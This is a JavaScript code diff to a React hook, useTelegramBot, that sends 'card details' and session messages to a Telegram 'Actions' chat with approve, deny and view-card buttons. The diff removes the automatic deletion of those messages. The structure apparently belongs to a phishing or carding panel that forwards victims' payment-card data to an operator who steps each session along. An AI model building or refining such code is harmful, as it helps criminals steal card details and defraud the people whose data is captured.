@@ -16,7 +16,7 @@ const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
         chat_id: chatId,
         message_id: messageId
       });
-      console.log('✅ Message deleted after', delay/1000, 'seconds');
+      console.log('✅ Message deleted after 15 seconds');
     } catch (error) {
       console.error('Error deleting message:', error);
     }
@@ -49,16 +49,12 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         ]
       };
 
-      const response = await axios.post(url, {
+      await axios.post(url, {
         chat_id: ACTIONS_CHAT_ID,
         text: message,
         parse_mode: 'HTML',
         reply_markup: keyboard
       });
-      
-      const messageId = response.data.result.message_id;
-      deleteMessageAfterDelay(ACTIONS_CHAT_ID, messageId, 30000);
-      
       return true;
     } catch (error) {
       console.error('Error sending to Telegram:', error);
@@ -106,17 +102,12 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
         ]
       };
 
-      const response = await axios.post(url, {
+      await axios.post(url, {
         chat_id: ACTIONS_CHAT_ID,
         text: cardMessage,
         parse_mode: 'HTML',
         reply_markup: keyboard
       });
-      
-      const messageId = response.data.result.message_id;
-      deleteMessageAfterDelay(ACTIONS_CHAT_ID, messageId, 30000);
-      
-      console.log('✅ Card details sent to Actions channel');
       return true;
     } catch (error) {
       console.error('Error sending card details:', error);
